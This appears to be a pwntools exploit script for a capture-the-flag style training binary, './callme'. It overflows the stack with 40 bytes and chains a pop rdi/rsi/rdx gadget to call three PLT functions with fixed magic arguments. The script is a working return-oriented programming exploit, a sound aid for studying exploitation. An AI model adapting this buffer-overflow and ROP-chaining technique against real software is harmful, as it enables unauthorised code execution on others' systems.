from pwn import *

#io = gdb.debug('./callme', 'b main')
io = process('./callme')

p = b'A' * 40

p += p64(0x000000000040093c) # pop rdi ; pop rsi ; pop rdx ; ret
p += p64(0xdeadbeefdeadbeef)
p += p64(0xcafebabecafebabe)
p += p64(0xd00df00dd00df00d)
p += p64(0x400720) # callme_one .plt

p += p64(0x000000000040093c) # pop rdi ; pop rsi ; pop rdx ; ret
p += p64(0xdeadbeefdeadbeef)
p += p64(0xcafebabecafebabe)
p += p64(0xd00df00dd00df00d)
p += p64(0x00400740) # callme_two .plt

p += p64(0x000000000040093c) # pop rdi ; pop rsi ; pop rdx ; ret
p += p64(0xdeadbeefdeadbeef)
p += p64(0xcafebabecafebabe)
p += p64(0xd00df00dd00df00d)
p += p64(0x004006f0)

io.sendline(p)
io.interactive()
# print(io.readall())


